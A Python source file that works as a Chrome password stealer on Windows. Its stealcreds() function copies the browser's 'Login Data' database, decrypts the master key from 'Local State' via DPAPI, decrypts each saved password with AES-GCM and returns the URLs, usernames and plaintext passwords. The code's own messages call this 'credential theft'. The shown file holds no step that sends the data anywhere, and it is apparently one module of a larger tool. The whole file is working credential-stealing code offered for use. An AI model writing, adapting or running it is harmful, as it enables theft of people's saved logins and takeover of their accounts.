import os
import json
import base64
import sqlite3
import shutil
from datetime import timezone, datetime, timedelta
import platform

try:
    import win32crypt
    from Crypto.Cipher import AES
    WINDOWS_LIBS_AVAILABLE = True
except ImportError:
    WINDOWS_LIBS_AVAILABLE = False

def my_chrome_datetime(time_in_mseconds):
    return datetime(1601, 1, 1) + timedelta(microseconds=time_in_mseconds)

def encryption_key():
    if not WINDOWS_LIBS_AVAILABLE:
        return None
        
    localState_path = os.path.join(os.environ.get("USERPROFILE", ""),
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    if not os.path.exists(localState_path):
        return None
        
    with open(localState_path, "r", encoding="utf-8") as file:
        local_state_file = file.read()
        local_state_file = json.loads(local_state_file)
    ASE_key = base64.b64decode(local_state_file["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(ASE_key, None, None, None, 0)[1]  # decryted key

def decrypt_password(enc_password, key):
    if not WINDOWS_LIBS_AVAILABLE or key is None:
        return "Decryption not supported on this OS"
        
    try:
        init_vector = enc_password[3:15]
        enc_password = enc_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, init_vector)
        return cipher.decrypt(enc_password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(enc_password, None, None, None, 0)[1])
        except:
            return "No Passwords(logged in with Social Account)"

def stealcreds():
    if platform.system() != "Windows" or not WINDOWS_LIBS_AVAILABLE:
        return {"info": "Credential theft only supported on Windows in this version"}

    password_db_path = os.path.join(os.environ.get("USERPROFILE", ""), "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Login Data")
    
    if not os.path.exists(password_db_path):
         return {"info": "Chrome Login Data not found"}
         
    shutil.copyfile(password_db_path,"my_chrome_data.db")
    db = sqlite3.connect("my_chrome_data.db")
    cursor = db.cursor()
    try:
        cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
        encp_key = encryption_key()
        data = {}
        for row in cursor.fetchall():
            site_url = row[0]
            username = row[1]
            password = decrypt_password(row[2], encp_key)
            date_created = row[3]
            if username or password:
                data[site_url] = []
                data[site_url].append({
                    "username": username,
                    "password": password,
                    "date_created": str(my_chrome_datetime(date_created))
                    })
            else:
                continue 
    except Exception as e:
        data = {"error": str(e)}
    finally:
        cursor.close()
        db.close()
        os.remove("my_chrome_data.db")
    
    return data